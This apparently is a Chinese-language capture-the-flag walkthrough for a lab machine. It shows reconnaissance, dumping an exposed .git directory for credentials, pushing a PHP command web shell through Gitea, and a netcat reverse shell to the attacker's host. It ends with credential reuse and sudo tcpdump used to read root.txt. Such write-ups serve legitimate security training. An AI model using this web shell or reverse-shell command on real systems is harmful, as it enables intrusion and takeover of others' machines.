# 信息搜集

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.21.14  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-10 01:58 EDT
Nmap scan report for 192.168.21.14
Host is up (0.00053s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:B0:6C:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.82 seconds
```

# 漏洞利用

看一下80页面，可以获得几个用户名

<img width="1078" height="558" alt="图片" src="https://github.com/user-attachments/assets/bd75f529-b4f8-426f-9fd2-17bdcf193397" />

目录扫描,发现了git

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.21.14
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.14
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/public               (Status: 301) [Size: 315] [--> http://192.168.21.14/public/]
/dev                  (Status: 301) [Size: 312] [--> http://192.168.21.14/dev/]
/logs                 (Status: 301) [Size: 313] [--> http://192.168.21.14/logs/]
/backups              (Status: 301) [Size: 316] [--> http://192.168.21.14/backups/]
/server-status        (Status: 403) [Size: 278]
Progress: 1185254 / 1185255 (100.00%)
===============================================================
Finished
===============================================================
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.21.14/dev -x html,php,txt,jpg,png,zip,git            
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.14/dev
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,jpg,png,zip,git
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git                 (Status: 301) [Size: 317] [--> http://192.168.21.14/dev/.git/]                                            
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 8707]
/config.txt           (Status: 200) [Size: 757]
/.git                 (Status: 301) [Size: 317] [--> http://192.168.21.14/dev/.git/]                                            
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 278]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

下载下来，查看config文件，拿到了账号密码

```
┌──(kali㉿kali)-[~]
└─$ git-dumper http://192.168.21.14/dev/.git /tmp/dev_git
[-] Testing http://192.168.21.14/dev/.git/HEAD [200]
[-] Testing http://192.168.21.14/dev/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://192.168.21.14/dev/.gitignore [404]
[-] http://192.168.21.14/dev/.gitignore responded with status code 404
[-] Fetching http://192.168.21.14/dev/.git/ [200]
[-] Fetching http://192.168.21.14/dev/.git/branches/ [200]
[-] Fetching http://192.168.21.14/dev/.git/HEAD [200]
[-] Fetching http://192.168.21.14/dev/.git/config [200]
[-] Fetching http://192.168.21.14/dev/.git/FETCH_HEAD [200]
[-] Fetching http://192.168.21.14/dev/.git/ORIG_HEAD [200]
[-] Fetching http://192.168.21.14/dev/.git/COMMIT_EDITMSG [200]
[-] Fetching http://192.168.21.14/dev/.git/index [200]
[-] Fetching http://192.168.21.14/dev/.git/hooks/ [200]
[-] Fetching http://192.168.21.14/dev/.git/refs/ [200]
[-] Fetching http://192.168.21.14/dev/.git/logs/ [200]
[-] Fetching http://192.168.21.14/dev/.git/description [200]
[-] Fetching http://192.168.21.14/dev/.git/objects/ [200]
[-] Fetching http://192.168.21.14/dev/.git/refs/heads/ [200]
[-] Fetching http://192.168.21.14/dev/.git/refs/remotes/ [200]
[-] Fetching http://192.168.21.14/dev/.git/logs/HEAD [200]
[-] Fetching http://192.168.21.14/dev/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://192.168.21.14/dev/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://192.168.21.14/dev/.git/hooks/commit-msg.sample [200]
[-] Fetching http://192.168.21.14/dev/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://192.168.21.14/dev/.git/logs/refs/ [200]
[-] Fetching http://192.168.21.14/dev/.git/hooks/pre-commit.sample [200]
[-] Fetching http://192.168.21.14/dev/.git/hooks/pre-push.sample [200]
[-] Fetching http://192.168.21.14/dev/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://192.168.21.14/dev/.git/hooks/post-update.sample [200]
[-] Fetching http://192.168.21.14/dev/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://192.168.21.14/dev/.git/refs/tags/ [200]
[-] Fetching http://192.168.21.14/dev/.git/hooks/pre-receive.sample [200]
[-] Fetching http://192.168.21.14/dev/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://192.168.21.14/dev/.git/hooks/update.sample [200]
[-] Fetching http://192.168.21.14/dev/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://192.168.21.14/dev/.git/objects/19/ [200]
[-] Fetching http://192.168.21.14/dev/.git/objects/b8/ [200]
[-] Fetching http://192.168.21.14/dev/.git/objects/fb/ [200]
[-] Fetching http://192.168.21.14/dev/.git/objects/fa/ [200]
[-] Fetching http://192.168.21.14/dev/.git/objects/info/ [200]
[-] Fetching http://192.168.21.14/dev/.git/refs/heads/master [200]
[-] Fetching http://192.168.21.14/dev/.git/objects/pack/ [200]
[-] Fetching http://192.168.21.14/dev/.git/logs/refs/heads/ [200]
[-] Fetching http://192.168.21.14/dev/.git/refs/remotes/origin/ [200]
[-] Fetching http://192.168.21.14/dev/.git/objects/fa/cc413accf4a70dac43fb791822f94e4973cfc9 [200]
[-] Fetching http://192.168.21.14/dev/.git/objects/19/a57a20e86fec2eaf4c0a658c1ea1b8a7e44f80 [200]
[-] Fetching http://192.168.21.14/dev/.git/logs/refs/remotes/ [200]
[-] Fetching http://192.168.21.14/dev/.git/objects/b8/39d2f0decc7bc4b2bb7cfd8e9ecd53588538cf [200]
[-] Fetching http://192.168.21.14/dev/.git/objects/fb/6cd63f10ee9c1bbff9ce954d911ee1938184d2 [200]
[-] Fetching http://192.168.21.14/dev/.git/refs/remotes/origin/master [200]
[-] Fetching http://192.168.21.14/dev/.git/logs/refs/heads/master [200]
[-] Fetching http://192.168.21.14/dev/.git/logs/refs/remotes/origin/ [200]
[-] Fetching http://192.168.21.14/dev/.git/logs/refs/remotes/origin/master [200]
[-] Fetching http://192.168.21.14/dev/.git/info/ [200]
[-] Fetching http://192.168.21.14/dev/.git/info/exclude [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 2 paths from the index
┌──(kali㉿kali)-[/tmp/dev_git]
└─$ ls -la
total 16
drwxrwxr-x  3 kali kali  100 Sep 10 02:37 .
drwxrwxrwt 18 root root  460 Sep 10 02:37 ..
-rw-rw-r--  1 kali kali  757 Sep 10 02:37 config.txt
drwxrwxr-x  7 kali kali  280 Sep 10 02:37 .git
-rw-rw-r--  1 kali kali 8707 Sep 10 02:37 index.html
┌──(kali㉿kali)-[/tmp/dev_git]
└─$ cat config.txt    
# Maze-Sec 项目配置

[application]
name = Maze-Sec 官方网站
version = 1.0.0
environment = production

[security]
https_enabled = true
csp_header = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:"
xss_protection = 1; mode=block
hsts_enabled = true

[database]
# 数据库配置（示例）
host = db.maze-sec.internal
port = 3306
name = maze_sec
user = gitea
password = xxoo123456

[logging]
level = info
path = /var/log/maze-sec/app.log
max_size = 10MB
backup_count = 5

[features]
# 启用/禁用功能
team_section = true
contact_form = false
blog = false

[deployment]
# 部署设置
auto_update = true
update_schedule = 0 3 * * *  # 每天凌晨3点
backup_path = /backups/maze-sec
```

但是登录ssh失败，尝试3000端口，登录成功

3000端口运行着gitea服务，并且也存在/dev目录以及相同的文件，可能是同步的，写入php文件尝试

```
<?php
exec($_GET["cmd"])
?>
```

网站访问一下,没有404，说明成功了

```
┌──(kali㉿kali)-[~]
└─$ curl 192.168.21.14/dev/1.php
```

反弹一个shell

```
http://192.168.21.14/dev/1.php?cmd=busybox%20nc%20192.168.21.10%204444%20-e%20/bin/bash
```

# 权限提升

在/etc/todd下发现了config文件，其中有账号密码，但是却失败了

```
www-data@Team2:/etc/todd$ cat config.txt
cat config.txt
root:root123
www-data@Team2:/etc/todd$ su - root
su - root
Password: root123

su: Authentication failure
```

在/etc/gitea下找到了todd的账号密码

```
www-data@Team2:/etc/gitea$ cat app.ini
cat app.ini
WORK_PATH = /usr/local/bin

[server]
APP_DATA_PATH = /var/lib/gitea/data
HTTP_PORT = 3000
DOMAIN = localhost
ROOT_URL = http://localhost:3000/
DISABLE_SSH = true

[database]
DB_TYPE = mysql
HOST = localhost:3306
NAME = gitea
USER = gitea
PASSWD = GiteaDBPass123!
;todd = todd123
[repository]
ROOT = /var/lib/gitea/repositories

[security]
INSTALL_LOCK = true
SECRET_KEY = aBpj3FZSZEY0VqCneS1A32jsnSlcMfS1K4UCaLdAeMM=
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3NTY4ODc1OTF9.IOK_iwo5E-nCeCP-vgd_swfcE_HwHqMtRaKN9yyupk8

[service]
DISABLE_REGISTRATION = true

[oauth2]
JWT_SECRET = eAJaSF890F0le10ROIfyadhy8p-Xc8uNXA3TuEcWKQE
```

切换到了todd

```
www-data@Team2:/etc/gitea$ su - todd
su - todd
Password: todd123

todd@Team2:~$ id
id
uid=1000(todd) gid=1000(todd) groups=1000(todd)
```

没有提权成功，但是可以读取到root.txt

```
todd@Team2:~$ sudo -l
sudo -l
Matching Defaults entries for todd on Team2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User todd may run the following commands on Team2:
    (ALL) NOPASSWD: /usr/bin/tcpdump
$  sudo -u root /usr/bin/tcpdump -V /root/root.txt
tcpdump: flag{root-39f5db9cc390378373b0828ce85caf85}: No such file or directory
```
